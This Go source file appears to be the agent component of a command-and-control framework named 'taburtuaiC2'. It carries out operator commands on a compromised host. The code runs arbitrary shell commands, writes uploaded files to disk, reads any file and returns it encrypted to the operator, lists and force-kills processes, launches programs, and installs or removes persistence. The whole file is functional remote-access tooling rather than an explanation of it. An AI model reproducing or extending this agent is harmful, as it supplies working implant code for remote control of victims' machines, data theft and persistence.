package main

import (
	"bytes"
	"context"
	"encoding/base64"
//	"encoding/json"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/mjopsec/taburtuaiC2/shared/types"
)

// ExecuteCommand executes a command and returns the result
func ExecuteCommand(agent *Agent, cmd *types.Command) *types.CommandResult {
	result := &types.CommandResult{
		CommandID: cmd.ID,
		ExitCode:  0,
	}

	fmt.Printf("[*] Executing command (Type: %s): %s\n", cmd.OperationType, cmd.Command)

	// Change working directory if specified
	originalDir, _ := os.Getwd()
	if cmd.WorkingDir != "" {
		if err := os.Chdir(cmd.WorkingDir); err != nil {
			result.Error = fmt.Sprintf("Failed to change directory: %v", err)
			result.ExitCode = 1
			return result
		}
		defer os.Chdir(originalDir)
	}

	// Route to appropriate handler
	switch cmd.OperationType {
	case "upload":
		handleUpload(agent, cmd, result)
	case "download":
		handleDownload(agent, cmd, result)
	case "process_list":
		handleProcessList(cmd, result)
	case "process_kill":
		handleProcessKill(cmd, result)
	case "process_start":
		handleProcessStart(cmd, result)
	case "persist_setup":
		handlePersistenceSetup(cmd, result)
	case "persist_remove":
		handlePersistenceRemove(cmd, result)
	case "execute":
		fallthrough
	default:
		handleExecute(cmd, result)
	}

	// Encrypt result if crypto is available
	if agent.crypto != nil && !(cmd.OperationType == "download" && result.Encrypted) {
		encryptResult(agent, result)
	}

	return result
}

func handleUpload(agent *Agent, cmd *types.Command, result *types.CommandResult) {
	if cmd.DestinationPath == "" {
		result.Error = "Destination path missing"
		result.ExitCode = 1
		return
	}

	fileData := cmd.FileContent
	if cmd.IsEncrypted && agent.crypto != nil {
		decrypted, err := agent.crypto.DecryptData(string(fileData))
		if err != nil {
			result.Error = fmt.Sprintf("Failed to decrypt file: %v", err)
			result.ExitCode = 1
			return
		}
		fileData = decrypted
	}

	if err := ioutil.WriteFile(cmd.DestinationPath, fileData, 0644); err != nil {
		result.Error = fmt.Sprintf("Failed to write file: %v", err)
		result.ExitCode = 1
		return
	}

	result.Output = fmt.Sprintf("File uploaded successfully to %s", cmd.DestinationPath)
}

func handleDownload(agent *Agent, cmd *types.Command, result *types.CommandResult) {
	if cmd.SourcePath == "" {
		result.Error = "Source path missing"
		result.ExitCode = 1
		return
	}

	fileData, err := ioutil.ReadFile(cmd.SourcePath)
	if err != nil {
		result.Error = fmt.Sprintf("Failed to read file: %v", err)
		result.ExitCode = 1
		return
	}

	if agent.crypto != nil {
		encrypted, err := agent.crypto.EncryptData(fileData)
		if err != nil {
			result.Error = fmt.Sprintf("Failed to encrypt file: %v", err)
			result.ExitCode = 1
			return
		}
		result.Output = encrypted
		result.Encrypted = true
	} else {
		result.Output = base64.StdEncoding.EncodeToString(fileData)
		result.Encrypted = false
	}
}

func handleProcessList(cmd *types.Command, result *types.CommandResult) {
	var output []byte
	var err error

	if runtime.GOOS == "windows" {
		psCmd := `Get-Process | Select-Object Id,ProcessName,Path,Description | ConvertTo-Json -Compress`
		output, err = exec.Command("powershell", "-NoProfile", "-Command", psCmd).CombinedOutput()
	} else {
		output, err = exec.Command("ps", "-eo", "pid,comm,user,args", "--no-headers").CombinedOutput()
	}

	if err != nil {
		result.Error = fmt.Sprintf("Failed to list processes: %v", err)
		result.ExitCode = 1
		return
	}

	result.Output = strings.TrimSpace(string(output))
}

func handleProcessKill(cmd *types.Command, result *types.CommandResult) {
	if cmd.ProcessID != 0 {
		if runtime.GOOS == "windows" {
			output, err := exec.Command("taskkill", "/F", "/PID", strconv.Itoa(cmd.ProcessID)).CombinedOutput()
			if err != nil {
				result.Error = fmt.Sprintf("Failed to kill PID %d: %v", cmd.ProcessID, err)
				result.ExitCode = 1
			} else {
				result.Output = string(output)
			}
		} else {
			if err := exec.Command("kill", "-9", strconv.Itoa(cmd.ProcessID)).Run(); err != nil {
				result.Error = fmt.Sprintf("Failed to kill PID %d: %v", cmd.ProcessID, err)
				result.ExitCode = 1
			} else {
				result.Output = fmt.Sprintf("Process %d killed", cmd.ProcessID)
			}
		}
	} else if cmd.ProcessName != "" {
		if runtime.GOOS == "windows" {
			output, err := exec.Command("taskkill", "/F", "/IM", cmd.ProcessName).CombinedOutput()
			if err != nil {
				result.Error = fmt.Sprintf("Failed to kill %s: %v", cmd.ProcessName, err)
				result.ExitCode = 1
			} else {
				result.Output = string(output)
			}
		} else {
			if err := exec.Command("pkill", "-9", "-f", cmd.ProcessName).Run(); err != nil {
				result.Error = fmt.Sprintf("Failed to kill %s: %v", cmd.ProcessName, err)
				result.ExitCode = 1
			} else {
				result.Output = fmt.Sprintf("Process %s killed", cmd.ProcessName)
			}
		}
	} else {
		result.Error = "No process ID or name specified"
		result.ExitCode = 1
	}
}

func handleProcessStart(cmd *types.Command, result *types.CommandResult) {
	if cmd.ProcessPath == "" {
		result.Error = "Process path not specified"
		result.ExitCode = 1
		return
	}

	execCmd := exec.Command(cmd.ProcessPath, cmd.ProcessArgs...)
	output, err := execCmd.CombinedOutput()
	if err != nil {
		result.Error = fmt.Sprintf("Failed to start process: %v", err)
		result.ExitCode = 1
	} else {
		result.Output = fmt.Sprintf("Process started: %s", string(output))
	}
}

func handlePersistenceSetup(cmd *types.Command, result *types.CommandResult) {
	err := SetupPersistence(cmd.PersistMethod, cmd.PersistName, cmd.ProcessPath, cmd.ProcessArgs)
	if err != nil {
		result.Error = fmt.Sprintf("Failed to setup persistence: %v", err)
		result.ExitCode = 1
	} else {
		result.Output = fmt.Sprintf("Persistence configured: %s", cmd.PersistMethod)
	}
}

func handlePersistenceRemove(cmd *types.Command, result *types.CommandResult) {
	err := RemovePersistence(cmd.PersistMethod, cmd.PersistName)
	if err != nil {
		result.Error = fmt.Sprintf("Failed to remove persistence: %v", err)
		result.ExitCode = 1
	} else {
		result.Output = "Persistence removed successfully"
	}
}

func handleExecute(cmd *types.Command, result *types.CommandResult) {
	ctx := context.Background()
	if cmd.Timeout > 0 {
		var cancel context.CancelFunc
		ctx, cancel = context.WithTimeout(ctx, time.Duration(cmd.Timeout)*time.Second)
		defer cancel()
	}

	var execCmd *exec.Cmd
	if len(cmd.Args) > 0 {
		execCmd = exec.CommandContext(ctx, cmd.Command, cmd.Args...)
	} else {
		if runtime.GOOS == "windows" {
			execCmd = exec.CommandContext(ctx, "cmd", "/C", cmd.Command)
		} else {
			execCmd = exec.CommandContext(ctx, "sh", "-c", cmd.Command)
		}
	}

	var stdout, stderr bytes.Buffer
	execCmd.Stdout = &stdout
	execCmd.Stderr = &stderr

	err := execCmd.Run()
	result.Output = strings.TrimSpace(stdout.String())
	result.Error = strings.TrimSpace(stderr.String())

	if err != nil {
		if exitError, ok := err.(*exec.ExitError); ok {
			result.ExitCode = exitError.ExitCode()
		} else {
			result.ExitCode = 1
			if result.Error == "" {
				result.Error = err.Error()
			}
		}
	}
}

func encryptResult(agent *Agent, result *types.CommandResult) {
	if result.Output != "" {
		if encrypted, err := agent.crypto.EncryptData([]byte(result.Output)); err == nil {
			result.Output = encrypted
			result.Encrypted = true
		}
	}
	if result.Error != "" {
		if encrypted, err := agent.crypto.EncryptData([]byte(result.Error)); err == nil {
			result.Error = encrypted
			result.Encrypted = true
		}
	}
}
